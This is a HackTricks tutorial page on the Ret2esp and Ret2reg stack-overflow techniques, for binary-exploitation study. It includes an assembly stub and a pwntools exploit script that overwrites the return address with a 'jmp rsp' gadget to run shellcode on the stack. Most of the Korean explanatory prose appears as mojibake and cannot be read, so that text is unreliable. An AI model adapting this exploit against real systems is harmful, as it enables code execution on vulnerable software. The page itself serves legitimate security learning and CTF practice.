# Ret2esp / Ret2reg

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Ret2esp**

**ESP(ìŠ¤íƒ í¬ì¸í„°)ëŠ” í•­ìƒ ìŠ¤íƒì˜ ë§¨ ìœ„ë¥¼ ê°€ë¦¬í‚¤ê¸° ë•Œë¬¸ì—**, ì´ ê¸°ìˆ ì€ EIP(ëª…ë ¹ í¬ì¸í„°)ë¥¼ **`jmp esp`** ë˜ëŠ” **`call esp`** ëª…ë ¹ì˜ ì£¼ì†Œë¡œ êµì²´í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ì…¸ì½”ë“œê°€ ë®ì–´ì“´ EIP ë°”ë¡œ ë’¤ì— ë°°ì¹˜ë©ë‹ˆë‹¤. `ret` ëª…ë ¹ì´ ì‹¤í–‰ë˜ë©´ ESPëŠ” ë‹¤ìŒ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ë©°, ì •í™•íˆ ì…¸ì½”ë“œê°€ ì €ì¥ëœ ìœ„ì¹˜ì…ë‹ˆë‹¤.

**ì£¼ì†Œ ê³µê°„ ë°°ì¹˜ ë¬´ì‘ìœ„í™”(ASLR)**ê°€ Windows ë˜ëŠ” Linuxì—ì„œ í™œì„±í™”ë˜ì§€ ì•Šì€ ê²½ìš°, ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ë°œê²¬ëœ `jmp esp` ë˜ëŠ” `call esp` ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ [**ASLR**](../common-binary-protections-and-bypasses/aslr/)ì´ í™œì„±í™”ëœ ê²½ìš°, ì´ëŸ¬í•œ ëª…ë ¹ì„ ì°¾ê¸° ìœ„í•´ ì·¨ì•½í•œ í”„ë¡œê·¸ë¨ ìì²´ë¥¼ ì‚´í´ë´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê·¸ë¦¬ê³  [**PIE**](../common-binary-protections-and-bypasses/pie/)ë¥¼ ìš°íšŒí•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤).

ê²Œë‹¤ê°€ EIP ì†ìƒ ì´í›„ì— ì…¸ì½”ë“œë¥¼ ë°°ì¹˜í•  ìˆ˜ ìˆëŠ” ê²ƒì€, ìŠ¤íƒì˜ ì¤‘ê°„ì´ ì•„ë‹Œ, í•¨ìˆ˜ì˜ ì‘ë™ ì¤‘ì— ì‹¤í–‰ë˜ëŠ” `push` ë˜ëŠ” `pop` ëª…ë ¹ì´ ì…¸ì½”ë“œì— ê°„ì„­í•˜ì§€ ì•Šë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ì…¸ì½”ë“œê°€ í•¨ìˆ˜ì˜ ìŠ¤íƒ ì¤‘ê°„ì— ë°°ì¹˜ë˜ë©´ ì´ëŸ¬í•œ ê°„ì„­ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³µê°„ ë¶€ì¡±

RIPë¥¼ ë®ì–´ì“´ í›„ì— ì“¸ ê³µê°„ì´ ë¶€ì¡±í•œ ê²½ìš°(ì•„ë§ˆë„ ëª‡ ë°”ì´íŠ¸ ì •ë„), ì´ˆê¸° `jmp` ì…¸ì½”ë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•˜ì‹­ì‹œì˜¤:
```armasm
sub rsp, 0x30
jmp rsp
```
ê·¸ë¦¬ê³  ìŠ¤íƒì˜ ì´ˆê¸°ì— ì…¸ì½”ë“œë¥¼ ì‘ì„±í•˜ì‹­ì‹œì˜¤.

### ì˜ˆì‹œ

ì´ ê¸°ìˆ ì˜ ì˜ˆì‹œëŠ” [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ìµœì¢… ìµìŠ¤í”Œë¡œì‡ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

ìœ ì‚¬í•˜ê²Œ, í•¨ìˆ˜ê°€ ì…¸ì½”ë“œê°€ ì €ì¥ëœ ì£¼ì†Œë¥¼ ë°˜í™˜í•˜ëŠ” ê²ƒì„ ì•Œê³  ìˆë‹¤ë©´, **`call eax`** ë˜ëŠ” **`jmp eax`** ëª…ë ¹ì–´(ì¼ëª… **ret2eax** ê¸°ë²•)ë¥¼ í™œìš©í•˜ì—¬ ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤. eaxì™€ ë§ˆì°¬ê°€ì§€ë¡œ, **í¥ë¯¸ë¡œìš´ ì£¼ì†Œë¥¼ í¬í•¨í•˜ëŠ” ë‹¤ë¥¸ ë ˆì§€ìŠ¤í„°**ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (**ret2reg**).

### Example

You can find an example here: [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## Protections

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): ìŠ¤íƒì´ ì‹¤í–‰ ê°€ëŠ¥í•˜ì§€ ì•Šë‹¤ë©´, ì…¸ì½”ë“œë¥¼ ìŠ¤íƒì— ë°°ì¹˜í•˜ê³  ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì í”„í•´ì•¼ í•˜ë¯€ë¡œ ë„ì›€ì´ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): ì´ëŸ¬í•œ ë³´í˜¸ëŠ” esp ë˜ëŠ” ë‹¤ë¥¸ ë ˆì§€ìŠ¤í„°ë¡œ ì í”„í•  ëª…ë ¹ì–´ë¥¼ ì°¾ê¸° ì–´ë µê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## References

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
